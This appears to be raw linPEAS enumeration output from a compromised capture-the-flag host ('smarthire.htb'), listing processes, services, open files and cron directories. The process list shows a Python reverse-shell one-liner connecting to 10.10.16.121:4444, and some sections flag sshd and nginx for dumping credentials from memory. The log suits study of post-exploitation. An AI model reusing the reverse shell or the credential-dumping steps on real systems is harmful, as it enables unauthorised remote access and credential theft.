[1;96m[1;95msvcweb[0m[0m      1751  0.9  3.4 477552 139436 ?       Sl   03:29   0:01  _ [1;31m/var/[1;32mwww[0m/smarthire.htb/.venv/bin[0m/python3 [1;31m/var/www/smarthire.htb/.venv/bin[0m/gunicorn --workers 4 wsgi:app
[1;31mroot[0m        1033  0.2  1.1 1793164 46988 ?       Ssl  02:35   0:07 /usr/bin/containerd
[1;31mroot[0m        1037  0.0  0.0   6176  1120 tty1     Ss+  02:35   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
[1;31mroot[0m        1070  0.0  0.0  55236  1724 ?        Ss   02:35   0:00 nginx: master process /usr/sbin/nginx -g [1;34m[1;32mdaemon[0m[0m on; master_process on;
[1;34m[1;32mwww-data[0m[0m    1071  1.5  0.1  56624  7128 ?        S    02:35   0:51  _ nginx: worker process
[1;34m[1;32mwww-data[0m[0m    1072  1.3  0.1  56448  7100 ?        S    02:35   0:46  _ nginx: worker process
[1;31mroot[0m        1124  0.0  1.9 2055588 77796 ?       Ssl  02:35   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
[1;31mroot[0m        1465  0.0  0.0 1671280 3900 ?        Sl   02:36   0:00  _ /usr/bin/docker-[1;34mproxy[0m -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.17.0.2 -container-port 5000 -use-listen-fd
[1;31mroot[0m        1394  0.0  0.7 1701192 28100 ?       Ssl  02:36   0:00 /usr/bin/docker start -a mlflow-service
[1;31mroot[0m        1413  0.0  0.2 1233864 10276 ?       Sl   02:36   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 969dc29aadab69fa1e24cd3bcd4e94d02c08fe356324ba6ab7f8b7ea60c43fad -address /run/containerd/containerd.sock
[1;96m[1;95msvcweb[0m[0m      1437  0.0  4.1 397600 166076 ?       Ssl  02:36   0:03  _ /usr/local/bin/python3.11 /usr/local/bin/mlflow server --host 0.0.0.0 --port 5000 --backend-store-uri file:///app/mlruns --app-name basic-auth
[1;96m[1;95msvcweb[0m[0m      1485  0.0  0.5  31668 23176 ?        S    02:36   0:00      _ /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app()
[1;96m[1;95msvcweb[0m[0m      1486  0.5  4.1 472784 165760 ?       Sl   02:36   0:18          _ /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app()
[1;96m[1;95msvcweb[0m[0m      1487  0.4  4.1 472668 165700 ?       Sl   02:36   0:15          _ /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app()
[1;96m[1;95msvcweb[0m[0m      1488  0.5  4.1 472668 165740 ?       Sl   02:36   0:18          _ /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app()
[1;96m[1;95msvcweb[0m[0m      1489  0.6  4.1 472732 165772 ?       Sl   02:36   0:20          _ /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app()
[1;96m[1;95msvcweb[0m[0m      1743  0.0  0.0   2892  1044 ?        S    03:28   0:00 sh -c python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.121",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
[1;96m[1;95msvcweb[0m[0m      1744  0.0  0.2  17624 10472 ?        S    03:28   0:00  _ python3 -c import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.121",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
[1;96m[1;95msvcweb[0m[0m      1745  0.0  0.1   8696  5312 pts/1    Ss   03:28   0:00      _ /bin/bash
[1;96m[1;95msvcweb[0m[0m      1760  2.6  0.0   4008  3032 pts/1    S+   03:30   0:01          _ /bin/sh ./linpeas.sh
[1;96m[1;95msvcweb[0m[0m     17907  0.0  0.0   4008  1312 pts/1    S+   03:31   0:00          |   _ /bin/sh ./linpeas.sh
[1;96m[1;95msvcweb[0m[0m     17910  0.0  0.0  10408  3684 pts/1    R+   03:31   0:00          |   |   _ ps faux[1;32mwww[0m
[1;96m[1;95msvcweb[0m[0m     17911  0.0  0.0   4008  1312 pts/1    S+   03:31   0:00          |   _ /bin/sh ./linpeas.sh
[1;96m[1;95msvcweb[0m[0m      1761  0.0  0.0   5776  1116 pts/1    S+   03:30   0:00          _ tee output.txt

[1;34m╔══════════╣ [1;32mProcesses with unusual configurations [1;90m(T1057)
[0mProcess 713 (root) - /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df 
SELinux context: /{,usr/}sbin/dhclient (enforce)
  └─ AppArmor profile: /{,usr/}sbin/dhclient (enforce)

Process 1437 (svcweb) - /usr/local/bin/python3.11 /usr/local/bin/mlflow server --host 0.0.0.0 --port 5000 --backend-store-ur
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)

Process 1485 (svcweb) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)

Process 1486 (svcweb) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)

Process 1487 (svcweb) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)

Process 1488 (svcweb) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)

Process 1489 (svcweb) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)


[1;34m╔══════════╣ [1;32mProcesses with credentials in memory (root req) [1;90m(T1003.007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
[0m[1;90mgdm-password Not Found
[0m[1;90mgnome-keyring-daemon Not Found
[0m[1;90mlightdm Not Found
[0m[1;90mvsftpd Not Found
[0m[1;90mapache2 Not Found
[0m[1;31msshd:[0m process found (dump creds from memory as root)
[1;90mmysql Not Found
[0m[1;90mpostgres Not Found
[0m[1;90mredis-server Not Found
[0m[1;90mmongod Not Found
[0m[1;90mmemcached Not Found
[0m[1;90melasticsearch Not Found
[0m[1;90mjenkins Not Found
[0m[1;90mtomcat Not Found
[0m[1;31mnginx[0m process found (dump creds from memory as root)
[1;90mphp-fpm Not Found
[0m[1;90msupervisord Not Found
[0m[1;90mvncserver Not Found
[0m[1;90mxrdp Not Found
[0m[1;90mteamviewer Not Found
[0m
[1;34m╔══════════╣ [1;32mOpened Files by processes [1;90m(T1003.007)
[0mProcess 1029 ([1;96m[1;95msvcweb[0m[0m) - /var/[1;32mwww[0m/smarthire.htb/.venv/bin/python3 /var/www/smarthire.htb/.venv/bin/gunicorn --workers 4 wsgi:
  └─ Has open files:
    └─ pipe:[24165]
    └─ /tmp/wgunicorn-kwkr8ns5 (deleted)
    └─ /tmp/wgunicorn-8u2h_bcg (deleted)
    └─ /tmp/wgunicorn-exh7t1jn (deleted)
    └─ /tmp/wgunicorn-b2voq8s6 (deleted)
Process 1123 ([1;96m[1;95msvcweb[0m[0m) - /var/[1;32mwww[0m/smarthire.htb/.venv/bin/python3 /var/www/smarthire.htb/.venv/bin/gunicorn --workers 4 wsgi:
  └─ Has open files:
    └─ pipe:[24165]
    └─ pipe:[24193]
    └─ /tmp/wgunicorn-8u2h_bcg (deleted)
Process 1125 ([1;96m[1;95msvcweb[0m[0m) - /var/[1;32mwww[0m/smarthire.htb/.venv/bin/python3 /var/www/smarthire.htb/.venv/bin/gunicorn --workers 4 wsgi:
  └─ Has open files:
    └─ pipe:[24165]
    └─ pipe:[22951]
    └─ /tmp/wgunicorn-exh7t1jn (deleted)
Process 1437 ([1;96m[1;95msvcweb[0m[0m) - /usr/local/bin/python3.11 /usr/local/bin/mlflow server --host 0.0.0.0 --port 5000 --backend-store-ur
  └─ Has open files:
    └─ pipe:[24900]
    └─ pipe:[24901]
Process 1485 ([1;96m[1;95msvcweb[0m[0m) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
  └─ Has open files:
    └─ pipe:[24900]
    └─ pipe:[24901]
    └─ pipe:[25962]
    └─ /tmp/wgunicorn-kpigh3xz (deleted)
    └─ /tmp/wgunicorn-hc8qmp3d (deleted)
    └─ /tmp/wgunicorn-0qcb4grd (deleted)
    └─ /tmp/wgunicorn-qfoew8lb (deleted)
Process 1486 ([1;96m[1;95msvcweb[0m[0m) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
  └─ Has open files:
    └─ pipe:[24900]
    └─ pipe:[24901]
    └─ pipe:[25962]
    └─ /tmp/wgunicorn-kpigh3xz (deleted)
    └─ pipe:[25060]
    └─ /app/basic_authdb[1;31m.db[0m
Process 1487 ([1;96m[1;95msvcweb[0m[0m) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
  └─ Has open files:
    └─ pipe:[24900]
    └─ pipe:[24901]
    └─ pipe:[25962]
    └─ pipe:[25971]
    └─ /tmp/wgunicorn-hc8qmp3d (deleted)
    └─ /app/basic_authdb[1;31m.db[0m
Process 1488 ([1;96m[1;95msvcweb[0m[0m) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
  └─ Has open files:
    └─ pipe:[24900]
    └─ pipe:[24901]
    └─ pipe:[25962]
    └─ pipe:[25974]
    └─ /tmp/wgunicorn-0qcb4grd (deleted)
    └─ /app/basic_authdb[1;31m.db[0m
Process 1489 ([1;96m[1;95msvcweb[0m[0m) - /usr/local/bin/python3.11 -m gunicorn -b 0.0.0.0:5000 -w 4 mlflow.server.auth:create_app() 
  └─ Has open files:
    └─ pipe:[24900]
    └─ pipe:[24901]
    └─ pipe:[25962]
    └─ pipe:[25987]
    └─ /app/basic_authdb[1;31m.db[0m
    └─ /tmp/wgunicorn-qfoew8lb (deleted)
Process 1695 ([1;96m[1;95msvcweb[0m[0m) - /var/[1;32mwww[0m/smarthire.htb/.venv/bin/python3 /var/www/smarthire.htb/.venv/bin/gunicorn --workers 4 wsgi:
  └─ Has open files:
    └─ pipe:[24165]
    └─ pipe:[686992]
    └─ /tmp/wgunicorn-b2voq8s6 (deleted)
Process 1744 ([1;96m[1;95msvcweb[0m[0m) - python3 -c import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.conn
  └─ Has open files:
    └─ /dev/ptmx
Process 1745 ([1;96m[1;95msvcweb[0m[0m) - /bin/bash 
  └─ Has open files:
    └─ /dev/pts/1
Process 1751 ([1;96m[1;95msvcweb[0m[0m) - /var/[1;32mwww[0m/smarthire.htb/.venv/bin/python3 /var/www/smarthire.htb/.venv/bin/gunicorn --workers 4 wsgi:
  └─ Has open files:
    └─ pipe:[24165]
    └─ /tmp/wgunicorn-kwkr8ns5 (deleted)
    └─ pipe:[689843]
Process 1761 ([1;96m[1;95msvcweb[0m[0m) - tee output.txt 
  └─ Has open files:
    └─ pipe:[689952]
    └─ /dev/pts/1
    └─ /tmp/output.txt

[1;34m╔══════════╣ [1;32mProcesses with memory-mapped credential files [1;90m(T1003.007)
[0m
[1;34m╔══════════╣ [1;32mProcesses whose PPID belongs to a different user (not root) [1;90m(T1134.004)
[0m[1;34m╚ [1;34m[3mYou will know if a user can somehow spawn processes as a different user
[0m
[1;34m╔══════════╣ [1;32mFiles opened by processes belonging to other users [1;90m(T1083)
[0m[1;34m╚ [1;34m[3mThis is usually empty because of the lack of privileges to read other user processes information
[0m
[1;34m╔══════════╣ [1;32mCheck for vulnerable cron jobs [1;90m(T1053.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
[0m[1;34m══╣ [1;32mCron jobs list [1;90m(T1053.003)
[0m/usr/bin/crontab
[1;90mincrontab Not Found
[0m[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m1[1;32m[0m3[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0mt[1;32m[0ma[1;32m[0mb[1;32m[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0md[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mS[1;32m[0me[1;32m[0mp[1;32m[0m [1;32m[0m1[1;32m[0m1[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m6[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m:[1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m1[1;32m[0m [1;32m[0mJ[1;32m[0ma[1;32m[0mn[1;32m[0m [1;32m[0m [1;32m[0m8[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32me2scrub_all[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0md[1;32m[0ma[1;32m[0mi[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m3[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m:[1;32m[0m3[1;32m[0m7[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m6[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m:[1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m3[1;32m[0m7[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0ml[1;32m[0m [1;32m[0m2[1;32m[0m4[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32mapport[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m7[1;32m[0m8[1;32m[0m [1;32m[0mA[1;32m[0mp[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m8[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32mapt-compat[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0mD[1;32m[0me[1;32m[0mc[1;32m[0m [1;32m[0m [1;32m[0m5[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m1[1;32m[0m [1;32mdpkg[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m3[1;32m[0m7[1;32m[0m7[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m2[1;32m[0m5[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32mlogrotate[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m3[1;32m[0m0[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m1[1;32m[0m7[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32mman-db[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0mh[1;32m[0mo[1;32m[0mu[1;32m[0mr[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mS[1;32m[0me[1;32m[0mp[1;32m[0m [1;32m[0m1[1;32m[0m1[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m6[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m:[1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0mm[1;32m[0mo[1;32m[0mn[1;32m[0mt[1;32m[0mh[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mS[1;32m[0me[1;32m[0mp[1;32m[0m [1;32m[0m1[1;32m[0m1[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m6[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m:[1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
